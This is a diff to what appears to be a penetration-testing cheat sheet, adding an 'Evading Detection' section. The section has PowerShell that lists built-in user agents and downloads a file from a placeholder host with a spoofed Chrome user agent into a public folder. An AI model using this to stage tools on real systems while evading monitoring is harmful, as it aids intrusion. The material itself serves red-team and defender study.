@@ -907,3 +907,27 @@ openssl enc -d -aes256 -iter 100000 -pbkdf2 -in <ENCRYPTED FILE> -out <FILE>
 </details>
 
 ---
+
+<details>
+<summary><h1>👻 Evading Detection</h1></summary>
+
+&nbsp;&nbsp;&nbsp;&nbsp;<details>
+<summary><h2>Changing User Agent</h2></summary>
+
+**Listing out User Agents**
+
+```powershell
+[Microsoft.PowerShell.Commands.PSUserAgent].GetProperties() | Select-Object Name,@{label="User Agent";Expression={[Microsoft.PowerShell.Commands.PSUserAgent]::$($_.Name)}} | fl
+```
+
+**Request with Chrome User Agent**
+```powershell
+$UserAgent = [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome
+
+Invoke-WebRequest http://<IP>/<FILE> -UserAgent $UserAgent -OutFile "C:\Users\Public\<OUTPUT FILE>"
+```
+
+</details>
+</details>
+
+---
